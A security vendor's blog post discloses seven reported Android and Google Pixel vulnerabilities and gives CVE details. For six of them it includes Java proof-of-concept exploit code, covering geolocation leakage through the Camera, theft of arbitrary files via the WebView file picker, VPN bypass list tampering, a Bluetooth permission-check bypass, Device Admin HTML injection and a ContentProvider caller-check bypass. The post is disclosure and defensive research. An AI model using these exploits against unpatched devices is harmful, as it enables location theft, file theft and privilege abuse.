---
source: oversecured
source_url: https://oversecured.com/blog/disclosure-of-7-android-and-google-pixel-vulnerabilities
title: "Disclosure of 7 Android and Google Pixel Vulnerabilities | Oversecured Blog"
author: "HubSpot, Inc."
description: "We continually refine and enhance the Oversecured Mobile Application Vulnerability Scanner through regular analysis of mobile applications. This helps us to optimize our analysis techniques and proactively mitigate potential vulnerabilities from malicious exploitation."
---

Dast is live!

Run a new scan to see dynamic findings in your reports

[Learn more →](https://oversecured.com/dast)

We continually refine and enhance the Oversecured Mobile Application Vulnerability Scanner through regular analysis of mobile applications. This helps us to optimize our analysis techniques and proactively mitigate potential vulnerabilities from malicious exploitation.

This article disclosed 7 vulnerabilities, 2 of which pose a threat to Google Pixel devices, while the others pose a threat to all Android devices, regardless of vendor.

For Pixel device users, these vulnerabilities could allow unprivileged applications to access their geolocation and give applications VPN bypass privileges.

Other vulnerabilities resulted in access to arbitrary components on behalf of the system (this vulnerability has been exploited in in-the-wild attacks), theft of arbitrary files via WebView with default settings, full access (including system settings) to Bluetooth due to incorrect permission checks, and HTML injection when adding Device Admin.

It is worth noting that, if you are reading this, all of issues has been fixed since we immediately reported them to Google.

## Access to the user’s geolocation through the camera

Vulnerability details:

- CVE: CVE-2024-0017

- Severity: High

- Reported on: May 31, 2023

- Fixed on: Dec 20, 2023


In Android, there is the Camera app, which allows the user to not only take photos and store them in the gallery, but also pass them to the calling app. For this purpose, there are a few actions in Android, such as

- `android.media.action.IMAGE_CAPTURE`

- `android.media.action.VIDEO_CAPTURE`


An application can be configured to store the geolocation where the user took the picture in the metadata. However, if Camera were to pass geolocation data to all applications, even those that don’t have access to geolocation, it would create a vulnerability. That’s why the developers considered such a case and created two handlers:

1. `com.android.camera.app.NoOpLocationProvider` is used if the calling application does not have the `android.permission.ACCESS_FINE_LOCATION` permission, this handler returns `null` for all geolocation requests.

2. `com.android.camera.app.LegacyLocationProvider` is used if the specified permission is requested by the calling application.


The `CameraActivity.shouldUseNoOpLocation()` method is used to select a handler. As you can see in the code, if `Activity.getCallingPackage()`returns `null`, Camera will use `LegacyLocationProvider` and pass the user’s geolocation to the calling application. However, this method only returns the calling application’s package name in cases where the `startActivityForResult()` method has been used. In other cases, such as the `startActivity()` method, this value will be `null`, exposing the location to unprivileged applications.

Proof of Concept The logic of the exploit is as follows:

1. The attacker should create an application that creates an intent with the `android.media.action.IMAGE_CAPTURE` action and calls Camera.

2. In the `output` field, the attacker can either pass the path to a file or a URI to their own content provider (this option is better, because there is no need to request any permissions).

3. When the user takes a picture, the content is written to the attacker’s content provider, where the attacker can read the location.


File `MainActivity.java`:

Intent i = newIntent("android.media.action.IMAGE\_CAPTURE");

i.setClassName("com.android.camera2","com.android.camera.CameraActivity");

i.putExtra("output",Uri.parse("content://test.provider/wow"));

startActivity(i);

newThread(() -\> {

try {

while(true){

File file = MyContentProvider.TEMP\_FILE;

if(file != null && file.exists() && file.length() \> 0){

ExifInterface exif = newExifInterface(file);

String lat = exif.getAttribute(ExifInterface.TAG\_GPS\_LATITUDE);

String lng = exif.getAttribute(ExifInterface.TAG\_GPS\_LONGITUDE);

Log.d("evil",String.format("Leaked lat = %s, long = %s",lat,lng));

file.delete();

return;

}

Thread.sleep(100);

}

}catch(Throwable th){

thrownewRuntimeException(th);

}

}).start();

File `MyContentProvider.java`:

public ParcelFileDescriptor openFile(Uri uri,String mode)throws FileNotFoundException {

Log.d("evil","openFile()");

resetFile();

returnParcelFileDescriptor.open(TEMP\_FILE,ParcelFileDescriptor.MODE\_READ\_WRITE);

}

private voidresetFile()throws FileNotFoundException {

try{

if(TEMP\_FILE.exists() && TEMP\_FILE.length() \> 0){

TEMP\_FILE.delete();

}

TEMP\_FILE.createNewFile();

}catch(IOException e){

thrownewFileNotFoundException(e.getMessage());

}

}

A proof of concept video:

[Download exploit sources.](https://blog.oversecured.com/assets/images/google/camera_exploit.zip)

## Default configuration of `WebChromeClient.FileChooserParams` leads to theft of arbitrary files

This vulnerability was originally triaged as High, but then severity changed to Low as Google engineers concluded that it was a developer error.

Vulnerability details:

- CVE: -

- Severity: Low

- Reported on: Nov 4, 2023

- Fixed on: Not fixed


The default implementation of the file picker functionality in WebView was insecure and led to theft of arbitrary files vulnerability. A typical flow is as follows:

1. Creating your own WebView instance with an implemented `WebChromeClient.onShowFileChooser()` method.

2. The `onShowFileChooser()` method calls `FileChooserParams.createIntent()` and passes the received implicit intent to `Activity.startActivityForResult()`. This intent can be handled by any third-party application installed on the same device.

3. In the `Activity.onActivityResult()`, the picked `Uri[]` values are obtained using the `FileChooserParams.parseResult()` method.

4. These `Uri[]` values are passed to the `ValueCallback.onReceiveValue()` method.


However, none of these methods somehow validate that the received URI is an internal file of the calling application. A third-party application installed on the same device can intercept the implicit intent and return a URI value that points to an internal file containing sensitive data. As a result, the web page will receive the contents of that file. It can be a huge risk if:

1. The web page is controlled by an attacker.

2. The web page is legitimate, but the file content is shared with third parties (email clients, cloud file storage, etc.).


### Proof of Concept

To reproduce the vulnerability, we’ve created two Android apps:

1. VictimApp, which creates a dummy file located in an internal app directory (`/data/user/0/com.victim/files/secret.txt`), launches an internal web server (`http://localhost:8080/`) that always responds with the following content:


<h1>Evil page</h1>

<form>

<inputtype="file"id="picker"/>

</form>

<script>

document.getElementById('picker').addEventListener('change',function(e){

constreader = newFileReader();

reader.onload = function(e){

alert(e.target.result);

};

reader.readAsText(e.target.files\[0\]);

});

</script>

and uses the provided flow to handle the picked file. When the file is picked, it will display its contents.

2.EvilPicker, which simply handles implicit intents and returns a `Uri` to the `/data/user/0/com.victim/files/secret.txt` file:

Intent resultIntent = newIntent();

resultIntent.setData(Uri.parse("file:///data/user/0/com.victim/files/secret.txt"));

setResult(-1,resultIntent);

A proof of concept video:

[Download exploit sources.](https://blog.oversecured.com/assets/images/google/webview_exploit.zip)

## Adding apps to the VPN bypass list

Vulnerability details:

- CVE: CVE-2023-21383

- Severity: High

- Reported on: Jun 2, 2023

- Fixed on: Dec 1, 2023


Oversecured scanned the Settings application (`com.android.settings`) and found that it uses undeclared permissions when declaring components in `AndroidManifest.xml`:

![](https://framerusercontent.com/images/RuSJ6qS2kXmnL0WjnWwT4k9GE.png?width=2230&height=2036)

This means two things:

1. The Settings app has been changed, it is different from the AOSP version. You can understand why this happens by reading the article [Discovering vendor-specific vulnerabilities in Android](https://blog.oversecured.com/Discovering-vendor-specific-vulnerabilities-in-Android/).

2. Google forgot to add the `com.google.android.wildlife.permission.VPN_APP_EXCLUSION_LAUNCH` and `com.google.android.wildlife.permission.ADVANCED_VPN_CONFIG`permissions to one of the system preinstalled applications. You can read more about this type of vulnerability in the [Common mistakes when using permissions in Android](https://blog.oversecured.com/Common-mistakes-when-using-permissions-in-Android/) article, where we talked about mistakes in ecosystem applications. However, these vulnerabilities are also very common in system applications from various vendors.


Thus, the `com.google.android.settings.vpn2.AppBypassBroadcastReceiver` allows an attacker to modify the lists of carrier apps and VPN bypass apps. The only limitation is that only system apps can be added to these lists. For example, the Google Chrome browser is a system application and can be added to these lists, which can be very risky for the user.

### Proof of Concept

The attacker should declare these permissions in their application:

<permissionandroid:name="com.google.android.wildlife.permission.VPN\_APP\_EXCLUSION\_LAUNCH"/>

<uses-permission android:name="com.google.android.wildlife.permission.VPN\_APP\_EXCLUSION\_LAUNCH" />

<permissionandroid:name="com.google.android.wildlife.permission.ADVANCED\_VPN\_CONFIG"/>

<uses-permission android:name="com.google.android.wildlife.permission.ADVANCED\_VPN\_CONFIG" />

Then run the following code to add Google Chrome to the VPN bypass list and check the result:

// adding \`com.android.chrome\` to the list

Intent i = newIntent("com.google.android.settings.action.UPDATE\_PREDEFINED\_APP\_EXCLUSION\_LIST");

i.setClassName("com.android.settings","com.google.android.settings.vpn2.AppBypassBroadcastReceiver");

i.putExtra("com.google.android.wildlife.extra.UPDATE\_PREDEFINED\_APP\_EXCLUSION\_LIST",newArrayList<>(Arrays.asList("com.android.chrome")));

sendBroadcast(i);

// opening the list of apps to observe the result

newHandler().postDelayed(() -\> {

startActivity(newIntent("com.google.android.settings.action.LAUNCH\_VPN\_APP\_EXCLUSION"));

},3000);

This will automatically add the application to the list:

![](https://framerusercontent.com/images/hyQsMdbUFleA13z7s1boaCY2x1U.png?width=1080&height=2400)

[Download exploit sources.](https://blog.oversecured.com/assets/images/google/permissions_exploit.zip)

## Incorrect Bluetooth permission check

Vulnerability details:

- CVE: CVE-2024-34719

- Severity: High

- Reported on: Aug 18, 2022

- Fixed on: Nov 1, 2024


As we described in the [Discovering vendor-specific vulnerabilities in Android](https://blog.oversecured.com/Discovering-vendor-specific-vulnerabilities-in-Android/) article, Android APIs are based on system services and managers that make them easy to use. Most of the services run from the system, but some of them are declared in privileged applications such as NFC, Bluetooth and others.

As we found out during our research, Bluetooth permissions were checked on the client side in classes like `android.bluetooth.BluetoothAdapter`, but at the system service level, it checked its own permissions, not those of the calling application, in cases where the attacker specified `attributionSource` set to `null`. Specifically, the `com.android.bluetooth` package contains the following permission checking methods:

public static boolean checkPermissionForDataDelivery(Context context,String str,AttributionSource attributionSource,String str2){

public static boolean checkConnectPermissionForDataDelivery(Context context,AttributionSource attributionSource,String str){

However, all of these methods accept an attacker-controlled `AttributionSource attributionSource` object and then create their own `AttributionSource` object:

AttributionSource build = newAttributionSource.Builder(context.getAttributionSource()).setNext(attributionSource).build();

PermissionManager permissionManager = (PermissionManager)context.getSystemService(PermissionManager.class);

if(permissionManager == null){

returnfalse;

}

if(permissionManager.checkPermissionForDataDeliveryFromDataSource("android.permission.ACCESS\_COARSE\_LOCATION",build,"Bluetooth location check") == 0){

returntrue;

}

In most AIDL methods, an attacker could bypass security checks and interact with Bluetooth in Android with system privileges. This issue also affected vendor-specific extensions that are not present in AOSP.

### Proof of Concept

In our proof of concept, we used the `IBluetooth.setName()` method to change the name of the device:

static final int TRANSACTION\_setName = 7;

protected voidonCreate(Bundle savedInstanceState){

super.onCreate(savedInstanceState);

try{

BluetoothAdapter adapter = BluetoothAdapter.getDefaultAdapter();

Field field = BluetoothAdapter.class.getDeclaredField("mService");

field.setAccessible(true);

IBinder binder = ((IInterface) field.get(adapter)).asBinder();

Parcel parcel = Parcel.obtain();

parcel.writeInterfaceToken(binder.getInterfaceDescriptor());

parcel.writeString("Pwned");// device name

parcel.writeInt(0);// null AttributionSource

Parcel reply = Parcel.obtain();

binder.transact(TRANSACTION\_setName,parcel,reply,0);

}catch(Throwable th){

thrownewRuntimeException(th);

}

}

However, most methods for working with Bluetooth, including privileged system APIs, are subject to this problem.

After running the code, the Bluetooth device name was changed:

![](https://framerusercontent.com/images/eHQdcq5Ag38gvrF5aj2o1nJNDo.png?width=1194&height=1812)

[Download exploit sources.](https://blog.oversecured.com/assets/images/google/bluetooth_exploit.zip)

## Mismatching parcel/unparcel logic for `WorkSource`

Vulnerability details:

- CVE: CVE-2023-20963

- Severity: High

- Reported on: Feb 17, 2022

- Fixed on: Mar 1, 2023


Google Project Zero has [described](https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2023/CVE-2023-20963.html) the technical details of this vulnerability. CNN has also published an [investigation](https://edition.cnn.com/2023/04/02/tech/china-pinduoduo-malware-cybersecurity-analysis-intl-hnk/index.html) into this attack. As it turns out, this vulnerability was exploited in in-the-wild attacks by the Pinduoduo app, the current developer of the [Temu](https://play.google.com/store/apps/details?id=com.einnovation.temu) app, starting on March 4, 2022 (version 6.2.0), and until it was discovered, the malicious code was removed from the app on February 22, 2023 (version 6.49.0). The app itself was also removed from Google Play soon after, but remains in some other app stores.

In short, this vulnerability allowed to attack the system and [launch arbitrary components](https://blog.oversecured.com/Android-Access-to-app-protected-components/) on its behalf. The thing is that for system applications, Android ignores any permission checks (such as `android:exported="false"` or permission requirements). Therefore, the vulnerability allowed access to arbitrary components of arbitrary applications installed on the same user’s device.

## HTML injection on the Device Admin request screen

Vulnerability details:

- CVE: CVE-2021-0600

- Severity: High

- Reported on: Jan 29, 2021

- Fixed on: Jun 24, 2021


Oversecured scanned the Settings app (`com.android.settings`) and detected the possibility of HTML injection using Spanned objects:

![](https://framerusercontent.com/images/GGGgBb2BXq5aIbB7tTu4o4k6iw.png?width=2264&height=4044)

The thing is that all methods for setting text in Android do not take a `java.lang.String` object as input, but a `java.lang.CharSequence`object. This is done on purpose to allow developers to create a formatted UI that includes formatted text, images, and so on. Thus, if an application receives a `CharSequence` object from an attacker and never casts a `String` object, the attacker will be able to create formatted text that contains some HTML elements.

This vulnerability is quite old, but we decided to include it in this article because this attack vector is still unexplored and little known to the community.

### Proof of Concept

Intent i = newIntent();

i.setClassName("com.android.settings","com.android.settings.applications.specialaccess.deviceadmin.ProfileOwnerAdd");

i.putExtra("android.app.extra.ADD\_EXPLANATION",Html.fromHtml("<s><h1>TEST</h1></s>"));

i.putExtra("android.app.extra.DEVICE\_ADMIN",newComponentName(this,MyReceiver.class));

startActivity(i);

After running the code, the Settings app requested permission to add a Device Admin app with attacker-controlled HTML elements:

![](https://framerusercontent.com/images/7yjqvklRE4BNDhD7abLcB593Acc.png?width=996&height=1806)

[Download exploit sources.](https://blog.oversecured.com/assets/images/google/deviceadmin_spanned_exploit.zip)

## Bypassing internal security checks in `ContentProvider.openFile()`

An interesting fact about this vulnerability is that initially the Google team considered it not a vulnerability and closed it as Works as designed. However, after [the public disclosure](https://x.com/_bagipro/status/1555594672571031552), they reopened the report and fixed it.

Vulnerability details:

- CVE: CVE-2023-21292

- Severity: High

- Reported on: Jun 19, 2022

- Fixed on: Aug 1, 2023


While investigating the `IActivityManager.openContentUri()` method, it turned out to fulfil the same role as `ContentResolver.openFile()`. However, a peculiarity of this method turned out to be that it does not save the caller’s context.

For example, if a provider is protected by permissions or the `android:exported` attribute, this attack would not work. But among Android Content Providers, including in AOSP and Google applications, there are those that perform internal checks on the caller like this:

public ParcelFileDescriptor openFile(Uri uri,String mode){

if(Binder.getCallingUid() != 1000){// system uid

returnnull;

}

if(getContext().checkCallingPermission("android.permission.LOCK\_DEVICE") != PackageManager.PERMISSION\_GRANTED/\\* 0 \*/){

returnnull;

}

// main logic

// ...

}

Because of context proxying, any `ContentProvider.openFile()` method would think it was called by the system, not a third-party application. As a result, `Binder.getCallingUid()` would return `1000` (`system`). Also, any methods like `Context.checkCallingPermission()` would return `true`.

### Proof of Concept

File `MainActivity.java`:

try{

final String uri = "content://victim.test/";

// 1, error

getContentResolver().openFile(Uri.parse(uri),"r",null);

// 2, success

IBinder binder = getService("activity");

Parcel parcel = Parcel.obtain();

parcel.writeInterfaceToken(binder.getInterfaceDescriptor());

parcel.writeString(uri);

Parcel reply = Parcel.obtain();

binder.transact(TRANSACTION\_openContentUri,parcel,reply,0);

reply.readException();

}catch(Throwable t){

thrownewRuntimeException(t);

}

private IBinder getService(String name){

return(IBinder)Class.forName("android.os.ServiceManager")

.getDeclaredMethod("getServiceOrThrow",String.class)

.invoke(null,name);

}

File `MyContentProvider.java`:

public ParcelFileDescriptor openFile(Uri uri,String mode){

Log.d("evil","openFile(), uid: " \+ Binder.getCallingUid());

// random system-only permission

Log.d("evil","Permission? " \+ getContext().checkCallingPermission("android.permission.LOCK\_DEVICE"));

// dummy return

returnnull;

}

[Download exploit sources.](https://blog.oversecured.com/assets/images/google/provider_bypass.zip)

## Conclusions

According to its established policy, Google’s Project Zero vulnerability research team publicly discloses any identified vulnerabilities after 90 days. As highlighted in this article, Google’s Vulnerability Disclosure Program (VDP) team has made significant strides in addressing high-severity Android vulnerabilities over the years. However, some cases illustrate the need for quicker action: for example, the parcel/unparcel mismatch vulnerability, which we reported on February 17, 2022, was only patched on March 1, 2023 — over a year later and after it became known that the vulnerability had been exploited in the wild by the Pinduoduo app.

While we greatly respect the work of Google’s engineers, it’s clear that a faster and more proactive approach to patching vulnerabilities is essential to safeguarding Android users.

This example also highlights the critical role of vulnerability scanners in the development process. Integrating regular scanning can significantly reduce risks for both companies and users by identifying vulnerabilities early in the codebase.

If your team needs support identifying and mitigating mobile app vulnerabilities, Oversecured offers comprehensive scanning solutions to cover all potential attack vectors. [Contact us](https://app.oversecured.com/contact-us) for a demo or to discuss SSDLC integration options.

##### Keep reading

[View all](https://oversecured.com/blog)

[![](https://framerusercontent.com/images/OnN0UKCOhnnXin2eBts9J3SaUQ.png?width=5592&height=3259)\\
\\
20 Security Issues Found in Xiaomi Devices\\
\\
Oversecured found and resolved significant mobile security vulnerabilities in Xiaomi devices. Our team discovered 20 dangerous vulnerabilities across various applications and system components that pose a threat to all Xiaomi users. The vulnerabilities\\
\\
Case Study\\
\\
May 2, 2024\\
\\
15\\
\\
min read\\
\\
TOp article](https://oversecured.com/blog/20-security-issues-found-in-xiaomi-devices)

[![](https://framerusercontent.com/images/W9Wn9vbZPPJFNH7MN7Zx6QXches.png?width=2048&height=1194)\\
\\
Android deep link vulnerabilities: how intent filters lead to account takeover\\
\\
A technical guide to Android deep link security. Learn how intent filter misconfigurations lead to account takeover, and how mobile application security testing with SAST and DAST finds these vulnerability chains.\\
\\
Android Security\\
\\
Apr 27, 2026\\
\\
8\\
\\
min read](https://oversecured.com/blog/android-deep-link-vulnerabilities)

[![](https://framerusercontent.com/images/xSiSLs1y7y6Mzr4lWYWCpFoYmM4.png?width=2848&height=1656)\\
\\
Android security checklist: theft of arbitrary files\\
\\
Developers for Android do a lot of work with files and exchange them with other apps, for example, to get photos, images, or user data. \\
\\
Android Security\\
\\
May 20, 2022\\
\\
11\\
\\
min read\\
\\
TOp article](https://oversecured.com/blog/android-security-checklist-theft-of-arbitrary-files)

Book a personalized demo

During the demo with our cybersecurity experts you will get:

A free trial scan of your app

An analysis of your SAST and DAST findings

Practical insights on mobile security of your app

First name

Business email

How did you hear about us?

Book a demo

2026 © Oversecured

follow us

### [LinkedIn](https://www.linkedin.com/company/oversecured/)

### [Twitter (X)](https://x.com/oversecuredinc)

[Privacy Policy](https://oversecured.com/privacy)

[Terms of use](https://oversecured.com/terms)

[go up ↑](https://oversecured.com/blog/disclosure-of-7-android-and-google-pixel-vulnerabilities#header)

Chat Widget